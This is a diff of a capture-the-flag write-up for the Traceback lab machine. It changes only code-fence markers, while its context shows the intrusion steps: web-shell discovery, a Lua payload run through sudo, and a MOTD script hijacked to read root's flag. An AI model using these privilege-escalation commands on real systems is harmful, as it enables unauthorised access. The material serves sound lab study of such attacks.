@@ -19,7 +19,7 @@ card).
 
 Nmap indicates us that the Traceback machine is running OpenSSH and Apache:
 
-```raw
+```
 $ nmap -A 10.10.10.181 | tee nmap.txt
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 19:03 IST
 Nmap scan report for 10.10.10.181
@@ -64,7 +64,7 @@ one that the original attacker has left on the server!
 To create a wordlist with the web shells comprised in the Git repository, I
 called the [GitHub API][github-api-trees] with this one-liner command-line:
 
-```raw
+```
 $ curl -s https://api.github.com/repos/Xh4H/Web-Shells/git/trees/4c9bade954938d56597325b872739c1a2463cf91 | jq -r .tree[].path | grep -vi readme | tee web-shells.txt
 alfa3.php
 alfav3.0.1.php
@@ -100,7 +100,7 @@ The credentials `admin:admin` are hard-coded in the web shell:
 Then, I used the terminal available in the "Console" tab to poke around a
 little:
 
-```raw
+```
 $ id
 uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
 $ cat /home/webadmin/note.txt
@@ -112,7 +112,7 @@ Contact me if you have any question.
 
 A Lua tool?
 
-```raw
+```
 $ cat /home/webadmin/.bash_history
 ls -la
 sudo -l
@@ -135,13 +135,13 @@ behalf of `sysadmin` without password.
 Lua!". We can therefore use it to execute Lua payloads. We fill prepare one for
 reading the user flag:
 
-```raw
+```
 $ printf 'file = io.open("/home/sysadmin/user.txt", "r")\nio.input(file)\nprint(io.read())\nio.close(file)\n' > /tmp/read_flag.lua
 ```
 
 And then:
 
-```raw
+```
 $ sudo -u sysadmin /home/sysadmin/luvit /tmp/read_flag.lua
 ```
 
@@ -155,7 +155,7 @@ the server as `sysadmin` via SSH.
 
 During the rest of my investigation, something caught my attention:
 
-```raw
+```
 $ find / -type f -writable 2>/dev/null | grep -v '^/proc' | grep -v '^/sys'
 /etc/update-motd.d/50-motd-news
 /etc/update-motd.d/10-help-text
@@ -174,7 +174,7 @@ $ find / -type f -writable 2>/dev/null | grep -v '^/proc' | grep -v '^/sys'
 
 The `sysadmin` user can edit the MOTD scripts!
 
-```raw
+```
 $ ls -al /etc/update-motd.d/
 total 32
 drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
@@ -189,7 +189,7 @@ drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
 This is really bad (for the server's owner at least) because these scripts are
 executed upon any new SSH connection as defined in `/etc/pam.d/sshd`:
 
-```raw
+```
 ...
 # Print the message of the day upon successful login.
 # This includes a dynamically generated part from /run/motd.dynamic
@@ -201,13 +201,13 @@ session    optional     pam_motd.so noupdate
 
 All I need is to modify one of those scripts to print the root flag:
 
-```raw
+```
 $ echo 'cat /root/root.txt' >> /etc/update-motd.d/00-header
 ```
 
 And when one logs in via SSH:
 
-```raw
+```
 $ ssh -o PasswordAuthentication=no -i ~/.ssh/traceback sysadmin@10.10.10.181
 #################################
 -------- OWNED BY XH4H  ---------
